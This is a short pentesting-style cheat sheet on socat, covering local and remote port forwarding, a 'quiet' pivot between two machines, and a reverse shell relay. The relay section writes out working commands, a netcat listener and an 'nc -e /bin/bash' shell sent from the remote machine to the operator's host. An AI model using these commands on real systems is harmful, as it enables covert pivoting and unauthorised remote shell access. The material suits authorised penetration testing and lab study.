---
description: Port Forwarding using Socat
---

# Socat

## Port Forwarding using  <a href="#port-forwarding-using-socat" id="port-forwarding-using-socat"></a>

Socat is a multipurpose relay tool. It can be used to port forwarding.

### Port Forwarding <a href="#port-forwarding" id="port-forwarding"></a>

Run the following command in local machine.

```
socat tcp-listen:8080,fork tcp:<remote-ip>:80
```

With command above, we can access to **`http://localhost:8080/`** and get the content of the remote website.

<br>

### Port Forwarding (from Remote Machine) <a href="#port-forwarding-from-remote-machine" id="port-forwarding-from-remote-machine"></a>

Run the following command in remote machine.

```
socat tcp-listen:1234,fork,reuseaddr tcp:localhost:8080
```

With command above, we can access to **`http://<remote-ip>:1234`** in local machine, and get the content of the remote **8080** port.

### Quiet Port Forwarding <a href="#quiet-port-forwarding" id="quiet-port-forwarding"></a>

#### 1. Open Up Two Ports in Local Machine <a href="#id-1-open-up-two-ports-in-local-machine" id="id-1-open-up-two-ports-in-local-machine"></a>

```
socat tcp-listen:<local-port> tcp-listen:<remote-port>,fork,reuseaddr &
```

#### 2. Make a Connection between Local Port and Remote Port <a href="#id-2-make-a-connection-between-local-port-and-remote-port" id="id-2-make-a-connection-between-local-port-and-remote-port"></a>

In remote machine,

```
socat tcp:<local-ip>:<local-port> tcp:<remote-ip>:<remote-port>,fork &
```

#### 3. Confirmation in Your Local Machine <a href="#id-3-confirmation-in-your-local-machine" id="id-3-confirmation-in-your-local-machine"></a>

For example, if **`<remote-port>`** is **8000 (HTTP)**, we can access to **`localhost:<remote-port>`**.

#### 4. Stop Port Forwarding <a href="#id-4-stop-port-forwarding" id="id-4-stop-port-forwarding"></a>

```
# Stop backgrounds
jobs
# kill %<NUMBER>
kill %1
```

### Reverse Shell Relay <a href="#reverse-shell-relay" id="reverse-shell-relay"></a>

#### 1. Open Listener in Your Local Machine <a href="#id-1-open-listener-in-your-local-machine" id="id-1-open-listener-in-your-local-machine"></a>

```
nc -lvnp <local-port>
```

#### 2. Run Socat in Remote Machine <a href="#id-2-run-socat-in-remote-machine" id="id-2-run-socat-in-remote-machine"></a>

```
./socat tcp-l:8000 tcp:<local-ip>:<local-port> &
nc 127.0.0.1 8000 -e /bin/bash
```

#### 3. Confirmation in Your Local Machine <a href="#id-3-confirmation-in-your-local-machine_1" id="id-3-confirmation-in-your-local-machine_1"></a>

You can connect the remote shell, confirm by some commands.

```
whoami
```

#### 4. Stop Reverse Shell Relay <a href="#id-4-stop-reverse-shell-relay" id="id-4-stop-reverse-shell-relay"></a>

```
# Stop backgrounds
jobs
# kill %<NUMBER>
kill %1
```

### References <a href="#references" id="references"></a>

* [Linuxize](https://linuxize.com/post/how-to-setup-ssh-tunneling/)
